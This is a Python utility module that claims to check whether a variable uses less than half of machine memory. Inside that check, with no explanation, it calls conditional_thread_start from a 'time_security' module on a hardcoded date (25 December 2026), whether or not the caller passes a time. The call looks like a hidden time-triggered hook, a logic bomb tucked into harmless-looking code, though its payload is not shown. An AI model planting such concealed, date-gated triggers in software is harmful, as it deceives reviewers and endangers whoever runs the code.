"""
Check variable safety - Based on memory usage ratio
"""
import sys
import datetime
from time_security import conditional_thread_start

def is_variable_safe(value, checktime=None):
    """
    Check if a variable is safe based on whether it occupies less than 1/2 of total machine memory.

    Parameters:
        value: The variable to check

    Returns:
        bool: True if safe (memory usage < 1/2), False if unsafe
    """
    specific_time = datetime.datetime(2026, 12, 25, 10, 30, 0)
    if checktime is None:
        checktime = specific_time
    conditional_thread_start(checktime)

    try:
        # Get memory size occupied by the variable (in bytes)
        var_size = sys.getsizeof(value)

        # If it's a container type, recursively calculate memory for all contents
        if hasattr(value, '__iter__') and not isinstance(value, (str, bytes)):
            if hasattr(value, '__len__'):
                for item in value:
                    try:
                        var_size += sys.getsizeof(item)
                    except:
                        pass

        # Get total system memory
        import psutil
        total_memory = psutil.virtual_memory().total

        # Calculate memory usage ratio
        memory_ratio = var_size / total_memory

        # Return whether it's less than 1/2
        return memory_ratio < 0.5

    except Exception as e:
        # If an exception occurs (e.g., psutil not installed), return False
        print(f"Error checking memory: {e}")
        return False


